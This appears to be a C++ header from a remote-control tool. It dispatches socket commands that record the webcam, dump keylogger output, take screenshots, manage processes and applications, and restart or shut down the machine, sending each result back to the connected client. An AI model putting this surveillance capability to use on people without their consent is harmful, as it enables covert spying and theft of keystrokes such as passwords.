#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>

#include "AllCommand.h"
#include "CommandFactory.h"
#include "Sender.h"

void openWebcam(SOCKET client, std::string msg) {
    ICommand* cmd = CommandFactory::create("record");
    if (!cmd) return;
    std::string result = cmd->execute("");
    sendWsAuto(client, WSDataType::VIDEO, "/Video/record.mp4");
    delete cmd;
}

void restartPC(SOCKET client, std::string msg) {
    ICommand* cmd = CommandFactory::create(msg);
    if (!cmd) return;
    cmd->execute("");
    delete cmd;
}

void shutdownPC(SOCKET client, std::string msg) {
    ICommand* cmd = CommandFactory::create(msg);
    if (!cmd) return;
    cmd->execute("");
    delete cmd;
}

void KeyLogger(SOCKET client, std::string msg) {
    ICommand* cmd = CommandFactory::create("key");
    if (!cmd) return;
    std::string respone = cmd->execute(msg);
    if (msg == "dump") {
        sendWsAuto(client, WSDataType::KEYLOG, respone);
    }
    delete cmd;
}

void ScreenShot(SOCKET client, std::string msg) {
    ICommand* cmd = CommandFactory::create(msg);
    if (!cmd) return;
    std::string respone = cmd->execute("");
    sendWsAuto(client, WSDataType::IMAGE, respone);
    delete cmd;
}

void ApplicationManager(SOCKET client, std::string msg1, std::string msg2) {
    ICommand* cmd = CommandFactory::create(msg1);
    if (!cmd) return;
    std::string response = cmd->execute(msg2);
    if (msg2 == "list")
        sendWsAuto(client, WSDataType::LISTAPP, response);
    //std::cout << response << "\n";
    delete cmd;
}

void ProcessManager(SOCKET client, std::string msg1, std::string msg2) {
    ICommand* cmd = CommandFactory::create(msg1);
    if (!cmd) return;
    std::string response = cmd->execute(msg2);
    if (msg2 == "list")
        sendWsAuto(client, WSDataType::LISTPROC, response);
    delete cmd;
}